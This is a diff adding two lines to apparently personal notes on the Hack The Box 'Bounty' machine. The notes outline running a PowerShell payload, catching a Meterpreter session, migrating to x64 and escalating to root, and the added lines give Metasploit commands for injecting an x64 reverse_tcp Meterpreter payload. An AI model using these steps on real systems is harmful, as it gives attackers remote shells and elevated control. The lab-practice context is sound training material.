@@ -245,6 +245,8 @@ HTB Bounty
  - powershell \path\to\payload
 5)run payload with powershell
 6)multi handler meterpreter
+You can do this by running the following commands after you already have a 32 bit Meterpreter shell: use windows/local/payload_inject 
+set payload windows/x64/meterpreter/reverse_tcp
 7)migrate to x64 shell
 8)run post explotation module and exploit(root)
  
